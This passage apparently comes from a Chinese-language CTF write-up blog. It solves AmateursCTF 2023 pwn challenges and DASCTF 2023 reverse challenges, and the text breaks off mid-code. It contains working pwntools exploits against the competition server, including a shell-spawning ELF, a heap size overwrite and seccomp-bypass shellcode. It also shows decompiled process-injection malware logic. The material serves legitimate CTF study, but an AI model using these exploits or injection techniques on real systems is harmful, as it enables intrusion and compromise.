0;}‍参考大佬wpAmateurCTF '23 - Pwn - Elfcrafting-V1 (theflash2k.me)‍​​‍​​​​‍amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}​7.pwn-ELFcrafting-v2  源码#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;time.h&gt;int  main(int argc, const char **argv, const char **envp){    int fd; // [rsp+24h] [rbp-6Ch]    int v6; // [rsp+28h] [rbp-68h]    int v7; // [rsp+28h] [rbp-68h]    int s1; // [rsp+2Ch] [rbp-64h] BYREF    char buf[88]; // [rsp+30h] [rbp-60h] BYREF      setbuf(stdout, 0LL);    setbuf(stderr, 0LL);    puts(\"I'm sure you all enjoy doing shellcode golf problems.\");    puts(\"But have you ever tried ELF golfing?\");    puts(\"Have fun!\");    s1 = 1179403647; // ELF 文件头    fd = memfd_create(\"golf\", 0LL);    if ( fd &lt; 0 )    {        perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");        exit(1);    }    v6 = read(0, buf, 0x4FuLL);    if ( v6 &lt; 0 )    {        perror(\"failed to execute ok = read(0, buffer, 79)\");        exit(1);    }    printf(\"read %d bytes from stdin\\n\", v6);    if ( memcmp(&amp;s1, buf, 4uLL) )    {        puts(\"not an ELF file :/\");        exit(1);    }    v7 = write(fd, buf, v6);    if ( v7 &lt; 0 )    {        perror(\"failed to execute ok = write(fd, buffer, ok)\");        exit(1);    }    printf(\"wrote %d bytes to file\\n\", v7);    if ( fexecve(fd, (char *const *)argv, (char *const *)envp) &lt; 0 )    {        perror(\"failed to execute fexecve(fd, argv, envp)\");        exit(1);    }    return 0;}  超级短小的 ELF 文件BITS 32    org 0x00010000    db 0x7F, \"ELF\"    dd 1    dd 0    dd $$    dw 2    dw 3    dd _start    dd _start    dd 4_cont:    mov dl, 0xff    int 0x80    mov ebx, eax    mov al, 3    jmp _end    dw 0x20    dw 1_start:    mov al, 11    mov ebx, string_start    int 0x80_end:    mov ecx, esp    int 0x80    xor ebx, ebx    mov al, 4    int 0x80string_start:    db \"/bin/sh\"string_len equ $ - string_startfilesize equ $ - $$‍nasm -f bin -o Execve Execve.asm &amp;&amp; chmod +x Execve &amp;&amp; hexdump -C Execve‍​​elf = \"7f454c46010000000000000000000100020003002e0001002e00010004000000b2ffcd8089c3b003eb0d20000100b00bbb41000100cd8089e1cd8031dbb004cd802f62696e2f7368\"直接吧这个 bin 发送出去，‍  exploitfrom pwn import *#io = process('./chal')io = remote('amt.rs', 31179)io.recv()with open('./shell', 'rb') as f:    buf = f.read()io.sendline(buf + b'\\x00')io.sendline('cat flag.txt')io.interactive()‍​​‍amateursCTF{d1d_i_f0rg3t_t0_p4tch_32b1t_b1naries_t00!!!}‍‍8.pwn-simple-heap-v1‍可以修改一个值​​‍‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31176)#gdb.attach(io,'b *$rebase(0x001600)')def getchunk(size,data):    sla('size: ',str(size))    sla('data: ',data)pay = 0x18 * \"A\"ru('Welcome to the flag checker\\n')getchunk(len(pay),pay)ru(\"I'll give you three chances to guess my flag.\\n\")getchunk(len(pay),pay)ru('index: ')sl('-8')ru('new character:')sl('\\x91')pay = 0x80 * \"A\"getchunk(len(pay),pay)io.interactive()‍我们来动态调试分析程序‍‍-8 是我提前计算好的，我们先传进去，然后继续分析‍​‍ptr + (-8) 也就是我们 堆块ptr的size​​修改之前的堆布局，我们等会给 这个 0x21 改成 大一点，只要可以 覆盖 下面的 tcachebins就可以了​​执行完 *(ptr + v4) = v3;​ 后 的堆布局​堆布局状态​‍执行完这个free后‍​​‍​​后面先是申请一个堆块，然后check() 里面再次申请一个堆块‍​​‍执行 getchunk()后， 此时 下面的tcachebins 已经被破坏，但是check()里的申请0x80仍然可以申请到‍​​跟进去​​执行后​​也是申请到了这里​​‍然后就是 open flag 把内容 放到这个堆块里​​​​‍然后就可以‍​​‍远程​​‍flag{wh0_kn3w_y0u_c0uld_unm4p_th3_libc}‍9.pwn-perfect-sandbox  这是一个完美的沙盒，绝对没有办法泄露flag！‍  源码#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;err.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;seccomp.h&gt;void setup_seccomp () {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    int ret = 0;    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);    ret |= seccomp_load(ctx);    if (ret) {        errx(1, \"seccomp failed\");    }}int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    char * tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    int urandom = open(\"/dev/urandom\", O_RDONLY);    if (urandom &lt; 0) {        errx(1, \"open /dev/urandom failed\");    }    read(urandom, tmp, 4);    close(urandom);    unsigned int offset = *(unsigned int *)tmp &amp; ~0xFFF;    uint64_t addr = 0x1337000ULL + (uint64_t)offset;    char * flag = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    if (flag == MAP_FAILED) {        errx(1, \"mapping flag failed\");    }    int fd = open(\"flag.txt\", O_RDONLY);    if (fd &lt; 0) {        errx(1, \"open flag.txt failed\");    }    read(fd, flag, 128);    close(fd);    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);    if (code == MAP_FAILED) {        errx(1, \"mmap failed\");    }    char * stack = mmap((void *)0x13371337000, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);    if (stack == MAP_FAILED) {        errx(1, \"failed to map stack\");    }    printf(\"&gt; \");    read(0, code, 0x100000);    setup_seccomp();    asm volatile(        \".intel_syntax noprefix\\n\"        \"mov rbx, 0x13371337\\n\"        \"mov rcx, rbx\\n\"        \"mov rdx, rbx\\n\"        \"mov rdi, rbx\\n\"        \"mov rsi, rbx\\n\"        \"mov rsp, 0x13371337000\\n\"        \"mov rbp, rbx\\n\"        \"mov r8,  rbx\\n\"        \"mov r9,  rbx\\n\"        \"mov r10, rbx\\n\"        \"mov r11, rbx\\n\"        \"mov r12, rbx\\n\"        \"mov r13, rbx\\n\"        \"mov r14, rbx\\n\"        \"mov r15, rbx\\n\"        \"jmp rax\\n\"        \".att_syntax prefix\\n\"        :        : [code] \"rax\" (code)        :    );}‍  沙箱​​‍‍由于程序已经open(flag)了 ，所以我们只要使用 read 读flag,然后再用 write输出出来就OK了‍下面等会在 jmp rax 出打个断点​​‍  测试 脚本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)#io = remote()gdb.attach(io,'b *0x0401594')pay = asm('''          nop          nop          nop          nop''')sl(pay)io.interactive()‍​​‍  上面的啥也不是，接下来我们来详细分析一下这题…..（分析了一下午）‍​扎心了，呜呜呜，在大佬眼了就是瞬秒题      真正的开始    OK ，总的来说这题还是比较有意思的，  经过测试，这题最完美的解决方法就是爆破地址‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'#libelf = './libseccomp.so.2.5.3'libelf = '/lib/x86_64-linux-gnu/libseccomp.so.2'context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']elf =  ELF(binary)libc = ELF(libelf)io = process(binary)#io = remote('amt.rs',31173)gdb.attach(io,'b *0x0401594')offset = 0x1000 * 41   # 主要是这个偏移地址，怎么得到的，先不用管，等会就知道了# (在一台机器上偏移是固定的, 不同的机器又是不一样的）# sc = f\"\"\"mov rsi,[{elf.got['seccomp_init']}]sub rsi,{libc.sym['seccomp_init']}add rsi,{offset}mov rsi,[rsi]and esi,0xFFFFF000add rsi,0x1337000mov rax, 1mov rdi, 1mov rdx, 0x100syscall\"\"\"ru('&gt; ')sl(asm(sc))io.interactive()  由于 NO PIE 所以我们直接从 got 里拿 libc上的地址​​​‍​libc.sym['seccomp_init']​  计算一个 libc 上的基地址， 我们就选取 ​/usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.4​ 的基地址，其实其他的基地址应该也可以‍​​​​执行完这个后，rsi 里的地址指向的就是​​就是 从 /dev/urandom​ 里读的随机数(我们先叫它key)，通过这个随机数我们就可以 经过计算就得到用来存放flag的随机地址.​​然后 用 key 通过这两个计算就可以得到 flag的地址了, and eax, 0FFFFF000h​ add rax, 1337000h​​​​然后就是 flag了​​下面就是 SYS_write 输出flag就行了​​  最终通用 exploit看重点，其实只要我们 以 0x1000 的倍数去才地址就可以了，最多最多就 0xff就可以得到 我们想要的地址.也要根据实际的  libseccomp.so.2.5.3版本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'#libelf = './libseccomp.so.2.5.3'libelf = '/lib/x86_64-linux-gnu/libseccomp.so.2'context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']elf =  ELF(binary)libc = ELF(libelf)for i in range(42,255):    io = process(binary)    io = remote('amt.rs',31173)    #gdb.attach(io,'b *0x0401594')    offset = 0x1000 * i    sc = f\"\"\"    mov rsi,[{elf.got['seccomp_init']}]    sub rsi,{libc.sym['seccomp_init']}    add rsi,{offset}     # 重点    mov rsi,[rsi]    and esi,0xFFFFF000    add rsi,0x1337000    mov rax, 1    mov rdi, 1    mov rdx, 0x100    syscall    \"\"\"    ru('&gt; ')    sl(asm(sc))    print(i)    try:        f = io.recv()        print(f)        if (b'flag' in f )or (b'FLAG' in f) or(b'ctf' in f) or (b'CTF' in f):            print(f)            break    except:        pass    io.close()‍​​​amateursCTF{3xc3pt10n_suppr3ss10n_ftw}​异常抑制ftw  参考AmateursCTF 2023 Write-Up - U+E000 私用領域 (hatenablog.com)‍‍简单操作系统 (amateurs.team)frog-math (amateurs.team)‍RE writeups‍业余爱好者CTF 2023 - 逆向工程文章 - FazeCT 博客"
  },
  
  {
    "title": "DASCTF 2023六月挑战赛｜二进制专项",
    "url": "/posts/DASCTF-2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-06-04 00:00:00 +0800",
    





    
    "snippet": "二进制专项-签到‍简单统计下参与人数，祝大家玩得开心~DASCTF{Welcome_to_DASCTF5}‍Reverse-careful‍  题目给出了一个恶意样本,请分析出样本请求服务器的域名(flag的形式为DASCTF{md5(域名)}) 其中md5值都是小写‍拿到题目直接 IDA Pro 打开, 一眼就可以看 gethostbyname();动态调试可以获取name的值,但是这个地...",
    "content": "二进制专项-签到‍简单统计下参与人数，祝大家玩得开心~DASCTF{Welcome_to_DASCTF5}‍Reverse-careful‍  题目给出了一个恶意样本,请分析出样本请求服务器的域名(flag的形式为DASCTF{md5(域名)}) 其中md5值都是小写‍拿到题目直接 IDA Pro 打开, 一眼就可以看 gethostbyname();动态调试可以获取name的值,但是这个地方获取的name不是真正的‍​​‍直接 快捷键 x  看 gethostbyname() 交叉引用 还有另一处‍​​‍直在这里下断点，然后动态调试‍​​‍得到 域名 Just_An_APIH00k11.com‍​​from hashlib import md5def md5sum(string):    return md5(string.encode('utf-8')).hexdigest()    passx = md5sum('Just_An_APIH00k11.com')print(x)# f18566f93963f72f463fdfa2d163c37c# flag{f18566f93963f72f463fdfa2d163c37c}‍Reverse-babyRe‍  so easy‍  根据字符串 error! 引用处一步一步往上找交叉引用的函数‍应该是函数的主要逻辑的地方了‍__int64 __fastcall sub_140007A80(int a1, __int64 a2){  char *v2; // rdi  __int64 i; // rcx  char v5[32]; // [rsp+0h] [rbp-40h] BYREF  char v6; // [rsp+40h] [rbp+0h] BYREF  DWORD dwProcessId; // [rsp+44h] [rbp+4h]  HANDLE v8; // [rsp+68h] [rbp+28h]  char Parameter[132]; // [rsp+90h] [rbp+50h] BYREF  int j; // [rsp+114h] [rbp+D4h]  HRSRC hResInfo; // [rsp+138h] [rbp+F8h]  size_t Size; // [rsp+154h] [rbp+114h]  HGLOBAL hResData; // [rsp+178h] [rbp+138h]  void *Src; // [rsp+198h] [rbp+158h]  void *v15; // [rsp+1B8h] [rbp+178h]  __int64 v16; // [rsp+1D8h] [rbp+198h]  __int64 v17; // [rsp+1F8h] [rbp+1B8h]  int k; // [rsp+214h] [rbp+1D4h]  __int64 v19; // [rsp+2E8h] [rbp+2A8h]  v2 = &amp;v6;  for ( i = 130i64; i; --i )  {    *(_DWORD *)v2 = -858993460;    v2 += 4;  }  sub_1400012A8(&amp;unk_1400140F4);  dwProcessId = GetCurrentProcessId();  v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);  if ( a1 != 2 )    exit(0);  for ( j = 0; ; ++j )  {    v19 = j;    if ( j &gt;= strlen(*(const char **)(a2 + 8)) )      break;    Parameter[j] = *(_BYTE *)(*(_QWORD *)(a2 + 8) + j);  }  hResInfo = FindResourceW(0i64, (LPCWSTR)0x65, L\"cod\");  LODWORD(Size) = SizeofResource(0i64, hResInfo);  hResData = LoadResource(0i64, hResInfo);  Src = LockResource(hResData);  v15 = malloc((unsigned int)Size);  memcpy(v15, Src, (unsigned int)Size);  sub_140001087(v15);  v16 = qword_14000FC30(v8, 0i64, 874i64, 4096i64, 64);  qword_14000FC28(v8, v16, v15, 874i64, 0i64);  v17 = qword_14000FC18(v8, 0i64, 0i64, v16, Parameter, 0, 0i64);  Sleep(0x1F4u);  for ( k = 0; k &lt; 44; ++k )    ;  CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, 0, 0i64);  Sleep(0x190u);  sub_140001253(v5, &amp;unk_14000BEE0);  return 0i64;}  直接看的话还不是很好看，我先修复下函数的名字  可以看注释‍__int64 __fastcall sub_140007A80(int argv_value, char **argv){  char *v2; // rdi  __int64 i; // rcx  char v5[32]; // [rsp+0h] [rbp-40h] BYREF  char v6; // [rsp+40h] [rbp+0h] BYREF  DWORD dwProcessId; // [rsp+44h] [rbp+4h]  HANDLE v8; // [rsp+68h] [rbp+28h]  char Parameter[132]; // [rsp+90h] [rbp+50h] BYREF  int j; // [rsp+114h] [rbp+D4h]  HRSRC hResInfo; // [rsp+138h] [rbp+F8h]  size_t Size; // [rsp+154h] [rbp+114h]  HGLOBAL hResData; // [rsp+178h] [rbp+138h]  void *Src; // [rsp+198h] [rbp+158h]  void *data; // [rsp+1B8h] [rbp+178h]  __int64 v16; // [rsp+1D8h] [rbp+198h]  __int64 v17; // [rsp+1F8h] [rbp+1B8h]  int k; // [rsp+214h] [rbp+1D4h]  __int64 v19; // [rsp+2E8h] [rbp+2A8h]  v2 = &amp;v6;  for ( i = 130i64; i; --i )  {    *v2 = -858993460;    v2 += 4;  }  sub_1400012A8(&amp;unk_1400140F4);                // 检测调试，需要给patch掉，直接进去把里面的代码改成 ret  dwProcessId = GetCurrentProcessId();  v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);  if ( argv_value != 2 )                        // 必须有2个参数    exit(0);  for ( j = 0; ; ++j )  {    v19 = j;    if ( j &gt;= strlen(argv[1]) )      break;    Parameter[j] = argv[1][j];                  // 将第一个参数赋值给 Parameter                                                // bbre.exe flagstrings  }  hResInfo = FindResourceW(0i64, 0x65, L\"cod\");  LODWORD(Size) = SizeofResource(0i64, hResInfo);  hResData = LoadResource(0i64, hResInfo);  Src = LockResource(hResData);  data = malloc(Size);  memcpy(data, Src, Size);  Jmp_Xor_data(data);                           // 这里一个异或加解密的操作 长度是 874  v16 = qword_14000FC30(v8, 0i64, 874i64, 4096i64, 64);  qword_14000FC28(v8, v16, data, 874i64, 0i64);  v17 = qword_14000FC18(v8, 0i64, 0i64, v16, Parameter, 0, 0i64);// Parameter 只有在这个函数才被加密  Sleep(0x1F4u);  for ( k = 0; k &lt; 44; ++k )    ;  CreateThread(0i64, 0i64, StartAddress, Parameter, 0, 0i64);// startAddress 是一个检测flag的   Sleep(0x190u);  sub_140001253(v5, &amp;unk_14000BEE0);  return 0i64;}原来还可以这样读资源文件​‍  Xor_data()‍__int64 __fastcall Xor_data(char a1[]){  __int64 result; // rax  int i; // [rsp+24h] [rbp+4h]  result = sub_1400012A8(&amp;unk_1400140F4);  for ( i = 0; i &lt; 874; ++i )  {    a1[i] ^= byte_14000F000[i % 4];    result = (unsigned int)(i + 1);  }  return result;}需要注意的是 byte_14000F000,​如果 程序处于调试状态他会修改 byte_14000F000,这里等会给它 patch 掉‍​​‍  IsDebuggerPresent()#返回值如果当前进程在调试器上下文中运行，则返回值为非零。如果当前进程未在调试器的上下文中运行，则返回值为零。‍byte_14000F000 初始值是18h, 57h, 68h, 64h‍经过动态调试后 才发现执行完 Jmp_Xor_data() 后， data 是一堆代码‍​​‍  动态调试需要传参​直接去看 data,data里存的地址才是数据‍​​如果说你看到 or      [rcx+43F8ECh], al​ 就说明，初始的 byte_14000F000 还是被改了这样的话，可以断点在异或解密的前一条直接，然后把 byte_14000F000 改回去​​‍随便打个断点​​直接给它改回去‍​​然后继续运行动态解密完后我们在看下data有些花指令，我们给它处理一下​花指令​​出来完花指令后 快捷键p 创建函数 然后可以直接F5 看C 伪代码和里面我写好的注释‍__int64 __fastcall sub_22777CDEDAD(char a1[]){  char *v1; // rdi  __int64 i; // rcx  __int64 result; // rax  char v4; // [rsp+20h] [rbp+0h] BYREF  char v5[292]; // [rsp+30h] [rbp+10h] BYREF  unsigned int k; // [rsp+154h] [rbp+134h]  unsigned int v7; // [rsp+174h] [rbp+154h]  unsigned int v8; // [rsp+194h] [rbp+174h]  int v9; // [rsp+1B4h] [rbp+194h]  char v10[44]; // [rsp+1D8h] [rbp+1B8h] BYREF  unsigned int v11; // [rsp+204h] [rbp+1E4h]  char *__attribute__((__org_arrdim(0,0))) j; // [rsp+228h] [rbp+208h]  int v13; // [rsp+244h] [rbp+224h]  __int64 v14; // [rsp+3D8h] [rbp+3B8h]  v1 = &amp;v4;  for ( i = 150i64; i; --i )  {    *v1 = -858993460;    v1 += 4;  }  memset(v5, 0, 0x101ui64);  qmemcpy(v10, \"]Bb)\", 4);  v10[4] = 3;  v10[5] = 54;  v10[6] = 71;  v10[7] = 65;  v10[8] = 21;  v10[9] = 54;  v11 = 0;  for ( j = a1; *j; ++j )    ++v11;  for ( k = 0; k &lt; 0x100; ++k )    v5[k] = k;  v8 = 0;  v7 = 0;  for ( k = 0; k &lt; 0x100; ++k )  {    v9 = v5[k];    v7 = (v10[v8] + v9 + 2 * v7) % 0x100;    v5[k] = v5[v7];    v5[v7] = v9;    if ( ++v8 &gt;= 0xA )      v8 = 0;  }  v8 = 0;  sub_22777CDEF9E();                            // 没用，等会nop掉; 随便在 nop 处下个断点，来获取上面生成v5的值，用来给下面的解密  v7 = v8;  for ( k = 0; ; ++k )  {    result = v11;    if ( k &gt;= v11 )      break;    v7 = (v8 + v7) % 0x100;    v8 = (v5[v7] + v8) % 0x100;    v9 = v5[v7];    v5[v7] = v5[v8];    v5[v8] = v9;    v13 = v5[(v5[v7] + v8 + v5[v8]) % 0x100];    a1[k] ^= v13;                               // 加密处，毫无疑问 a1 就是我们传入的flag    v14 = k;    a1[k] += k % 0xD;  }  return result;}nop 掉 call sub_22777CDEF9E‍​​‍然后打断点，然后F9运行到这‍​F9 后，然后把这个int 3 也 nop 掉, 接下在上面的开头处 快捷键p ,然后f5 看C 伪代码​​再把上面的 v5 给他提取出来​​密文在Xor_data()函数里可以找到‍​​然后写解密脚本v5 = [  0x04, 0xFD, 0x67, 0xF4, 0x3F, 0x13, 0xC6, 0x86, 0x29, 0xAA,   0x89, 0x68, 0x93, 0x41, 0x6B, 0x9F, 0x95, 0x7C, 0x96, 0x87,   0x0C, 0x1C, 0x18, 0x7E, 0x23, 0x51, 0x2B, 0x72, 0x55, 0x94,   0x75, 0x3E, 0xFE, 0x00, 0x16, 0x30, 0x9B, 0x9C, 0xF6, 0x43,   0x5F, 0x69, 0x85, 0xE2, 0xE7, 0xAB, 0x7A, 0x5A, 0x0A, 0xA6,   0x81, 0x77, 0x17, 0x6C, 0xF2, 0x33, 0x6D, 0x35, 0x49, 0x0B,   0x61, 0x06, 0x34, 0xD7, 0x4B, 0x9E, 0xA3, 0x3C, 0xB5, 0x5C,   0x48, 0xB3, 0x05, 0xDC, 0xA7, 0x80, 0x71, 0x09, 0xAE, 0x28,   0x5B, 0xA8, 0xE6, 0x44, 0x14, 0xE3, 0x63, 0x4E, 0xF3, 0x1E,   0xC1, 0xDF, 0x26, 0x46, 0x07, 0x2F, 0xB1, 0x0D, 0xED, 0x6A,   0x19, 0xD1, 0xDE, 0x5E, 0x6F, 0x1D, 0x97, 0xC8, 0x66, 0xD6,   0x7B, 0xA0, 0x62, 0x3A, 0x40, 0xC5, 0x59, 0x1B, 0xCF, 0x83,   0x50, 0xC2, 0x8F, 0x58, 0xE5, 0xEA, 0x84, 0x38, 0x11, 0xC9,   0x37, 0x2E, 0xCE, 0xB8, 0x10, 0x90, 0xD9, 0x98, 0x45, 0xCD,   0xD5, 0x03, 0x57, 0x99, 0x25, 0x08, 0x74, 0xDD, 0x7D, 0xD4,   0x24, 0x12, 0x22, 0xB9, 0xBE, 0x0E, 0x4A, 0x20, 0xAF, 0xB4,   0x4F, 0x21, 0xF5, 0xCA, 0xEB, 0x0F, 0x9D, 0x36, 0xD0, 0xC3,   0x91, 0x3B, 0x2C, 0xEE, 0x1F, 0xE0, 0xB7, 0x70, 0xA2, 0x56,   0x9A, 0xB2, 0xA1, 0x60, 0xC0, 0xCC, 0xAC, 0x7F, 0xF9, 0x8A,   0xBD, 0xCB, 0x8C, 0xB6, 0x8D, 0xDB, 0x39, 0xFC, 0xD3, 0x88,   0xDA, 0x4D, 0x78, 0xFB, 0xBF, 0x1A, 0x02, 0x76, 0xBC, 0x47,   0x64, 0xE4, 0xA4, 0x4C, 0x15, 0x5D, 0xD2, 0xA5, 0x2D, 0xAD,   0xF7, 0xBA, 0x54, 0xF0, 0x8E, 0xA9, 0xEC, 0x52, 0x27, 0x42,   0xD8, 0xBB, 0xB0, 0x53, 0x31, 0x82, 0x8B, 0xEF, 0xC7, 0xF8,   0x32, 0xF1, 0xE9, 0xE8, 0x01, 0xFF, 0xC4, 0xFA, 0xE1, 0x65,   0x79, 0x73, 0x92, 0x6E, 0x2A, 0x3D, 0x00  ]flag = [0] * 45flag[0] = 0xF7flag[1] = 0x2Eflag[2] = 0x34flag[3] = 0xF0flag[4] = 0x72flag[5] = 0xCFflag[6] = 94flag[7] = 10flag[8] = 0xBBflag[9] = 0xECflag[10] = 0xB1flag[11] = 0x2Bflag[12] = 0x70flag[13] = 0x88flag[14] = 0x88flag[15] = 0xEDflag[16] = 0x46flag[17] = 0x38flag[18] = 0xDBflag[19] = 0xDAflag[20] = 0x6Cflag[21] = 0xBDflag[22] = 0xD4flag[23] = 6flag[24] = 0x77flag[25] = 0xF2flag[26] = 0xCFflag[27] = 0x56flag[28] = 0x88flag[29] = 0xC6flag[30] = 0x31flag[31] = 0xD2flag[32] = 0xB7flag[33] = 90flag[34] = 0xC1flag[35] = 0x42flag[36] = 0xB0flag[37] = 0xF4flag[38] = 72flag[39] = 0x37flag[40] = 0xF5flag[41] = 0x2Cflag[42] = 245flag[43] = 88v8 = 0v7 = 0for k in range(44):    v7 = (v8 + v7) % 0x100    v8 = (v5[v7] + v8) % 0x100    v9 = v5[v7]    v5[v7] = v5[v8]    v5[v8] = v9    v13 = v5[(v5[v7] + v8 + v5[v8]) % 0x100]    flag[k] -= k % 0xD    flag[k] ^= v13    flag[k] = flag[k] % 128print(flag)print(''.join(map(chr,flag)))[68, 65, 83, 67, 84, 70, 123, 48, 51, 52, 52, 54, 99, 50, 99, 45, 100, 102, 102, 55, 45, 49, 49, 101, 100, 45, 57, 50, 56, 53, 45, 53, 52, 101, 49, 97, 100, 57, 56, 100, 54, 52, 57, 125, 0]DASCTF{03446c2c-dff7-11ed-9285-54e1ad98d649}‍Reverse-ez_exe‍‍一共三个文件​​ez_exe.exe 是 python3.11 打包的‍​​用 python3.11 执行 pyinstxtractor.py 去解包​再用 Pycdc 去还原 python源代码#=[09:17:03]-➤  /opt/reverse/Pycdc ez_py.pyc # Source Generated with Decompyle++# File: ez_py.pyc (Python 3.11)import ctypesfrom time import *from ctypes import *from ctypes import wintypesfrom hashlib import md5class _STARTUPINFO(Structure):    _fields_ = [        ('cb', c_ulong),        ('lpReserved', c_char_p),        ('lpDesktop', c_char_p),        ('lpTitle', c_char_p),        ('dwX', c_ulong),        ('dwY', c_ulong),        ('dwXSize', c_ulong),        ('dwYSize', c_ulong),        ('dwXCountChars', c_ulong),        ('dwYCountChars', c_ulong),        ('dwFillAttribute', c_ulong),        ('dwFlags', c_ulong),        ('wShowWindow', c_ushort),        ('cbReserved2', c_ushort),        ('lpReserved2', c_char_p),        ('hStdInput', c_ulong),        ('hStdOutput', c_ulong),        ('hStdError', c_ulong)]class _PROCESS_INFORMATION(Structure):    _fields_ = [        ('hProcess', c_void_p),        ('hThread', c_void_p),        ('dwProcessId', c_ulong),        ('dwThreadId', c_ulong)]StartupInfo = _STARTUPINFO()ProcessInfo = _PROCESS_INFORMATION()key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())file = open('bin1', 'rb').read()arr = range(len(file))()open('bin1', 'wb').write(bytes(arr))sleep(0)bet = ctypes.windll.kernel32.CreateProcessA(b'bin1', ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), byref(StartupInfo), byref(ProcessInfo))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ProcessInfo.hProcess), ctypes.c_int(-1))open('bin1', 'wb').write(file)直接看的话，好像有点奇怪，key1 都没有调用的地方主要还是解密了bin1, 用 python3.11 运行 ez_py.pyc,会生成一个 gmon.out​运行后，bin1 会从密文状态解密成一个 PE32 可执行程序，‍​​​​‍HeD 打开 这个 ez_py.pyc 然后将 bin1 替换成bin2, 然后再去运行这个 ez_py.pyc‍​‍也是意料之中成长解密了bin2也运行了‍​​​​接下来用 IDA Pro 分析 bin2‍一个 btea 加密int __cdecl main(int argc, const char **argv, const char **envp){  int flag[11]; // [esp+10h] [ebp-B8h]  int key[4]; // [esp+3Ch] [ebp-8Ch] BYREF  int v6[12]; // [esp+4Ch] [ebp-7Ch] BYREF  char Str[50]; // [esp+7Eh] [ebp-4Ah] BYREF  int k; // [esp+B0h] [ebp-18h]  int j; // [esp+B4h] [ebp-14h]  size_t i; // [esp+B8h] [ebp-10h]  char *v11; // [esp+BCh] [ebp-Ch]  __main();  printf(\"please input your flag:\\n\");  scanf(\"%s\", Str);  if ( strlen(Str) != 44 )  {    MessageBoxA(0, \"worng length!\", &amp;Caption, 0);    exit(0);  }  v11 = Str;  for ( i = 0; strlen(Str) &gt;&gt; 2 &gt; i; ++i )  {    v6[i] = *(_DWORD *)v11;    v11 += 4;  }  key[0] = 0x4B5F;  key[1] = 0xDEAD;  key[2] = 0x11ED;  key[3] = 0xB3CC;  btea((unsigned int *)v6, 11, key);            // 加密  for ( j = 0; j &lt;= 10; ++j )    ;  flag[0] = 0xCC45699D;  flag[1] = 0x683D5352;  flag[2] = 0xB8BB71A0;  flag[3] = 0xD3817AD;  flag[4] = 0x7547E79E;  flag[5] = 0x4BDD8C7C;  